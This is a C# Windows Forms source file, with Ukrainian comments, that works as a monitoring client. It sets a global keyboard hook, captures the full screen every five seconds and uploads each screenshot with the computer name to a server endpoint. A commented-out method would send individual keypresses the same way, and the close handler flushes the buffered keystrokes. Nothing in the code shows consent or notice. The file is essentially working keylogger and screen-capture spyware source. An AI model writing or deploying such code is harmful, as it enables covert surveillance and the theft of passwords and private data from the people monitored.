using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Last5Launching
{
    public partial class Form1 : Form
    {
        private System.Windows.Forms.Timer _screenshotTimer;
        private MyKeyboardListener _keyboardListener;

        public Form1(MyKeyboardListener keyboardListener)
        {
            _keyboardListener = keyboardListener;
            _keyboardListener.SetHook();

            // Ініціалізація таймера для створення скріншотів
            _screenshotTimer = new System.Windows.Forms.Timer();
            _screenshotTimer.Interval = 5000; // Інтервал 5 секунд
            _screenshotTimer.Tick += ScreenshotTimer_Tick;
            _screenshotTimer.Start();
        }

        private void ScreenshotTimer_Tick(object sender, EventArgs e)
        {
            TakeScreenshot();
        }

        private async void TakeScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;

                // Створюємо скріншот
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    // Відправляємо скріншот на сервер
                    await SendScreenshotToServer(bitmap);
                }

                Console.WriteLine("Скріншот створено і надіслано на сервер.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Не вдалося створити скріншот: {ex.Message}");
            }
        }


        //public async Task SendKeyPressToServer(string keyPressed)
        //{
        //    string computerName = Environment.MachineName;

        //    using (HttpClient client = new HttpClient())
        //    {
        //        var data = new Dictionary<string, string>
        //        {
        //            { "computerName", computerName },
        //            { "keyPressed", keyPressed }
        //        };

        //        var content = new FormUrlEncodedContent(data);

        //        var response = await client.PostAsync("http://localhost:5283/api/save-keypress", content);

        //        if (response.IsSuccessStatusCode)
        //        {
        //            Console.WriteLine("Натиснута клавіша збережена на сервері.");
        //        }
        //        else
        //        {
        //            Console.WriteLine($"Помилка при збереженні натиснутої клавіші: {response.ReasonPhrase}");
        //        }
        //    }
        //}

        public async Task SendScreenshotToServer(Bitmap screenshot)
        {
            string computerName = Environment.MachineName;

            using (var memoryStream = new MemoryStream())
            {
                screenshot.Save(memoryStream, ImageFormat.Png);
                var imageBytes = memoryStream.ToArray();

                using (HttpClient client = new HttpClient())
                {
                    var content = new MultipartFormDataContent
            {
                { new StringContent(computerName), "computerName" },
                { new ByteArrayContent(imageBytes), "screenshotFile", "screenshot.png" }
            };

                    var response = await client.PostAsync("http://localhost:5283/api/save-screenshot", content);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Скріншот збережений на сервері.");
                    }
                    else
                    {
                        Console.WriteLine($"Помилка при збереженні скріншота: {response.ReasonPhrase}");
                    }
                }
            }
        }


        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _keyboardListener.FlushBufferOnExit(); // Відправка залишків буфера
            _keyboardListener.UnsetHook(); // Зняття хука
            base.OnFormClosed(e);
        }

    }
}
